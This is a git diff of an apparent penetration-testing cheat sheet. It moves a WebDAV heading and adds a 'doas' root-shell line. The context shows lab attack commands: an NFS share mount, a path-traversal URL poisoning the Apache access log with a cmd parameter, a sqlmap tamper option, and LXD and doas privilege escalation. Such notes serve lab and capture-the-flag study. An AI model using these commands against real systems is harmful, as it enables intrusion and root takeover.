@@ -71,7 +71,6 @@ mkdir tmp/
 sudo mount -t nfs 10.10.104.64: tmp
 tree tmp
 ```
-#### cadaver for WebDAV
 ---
 #### File Transfer on `Netcat`
 
@@ -128,6 +127,8 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 --tamper=space2comment
 ```
 
+#### cadaver for WebDAV
+
 ---
 ### Privilege Escalation:
 <details><summary> LXD container exploitation </summary> 
@@ -146,6 +147,7 @@ lxc exec ignite /bin/sh
 
 ```
 doas -u root openssl enc -in file
+doas -u root /bin/bash
 ```
 
 </details>
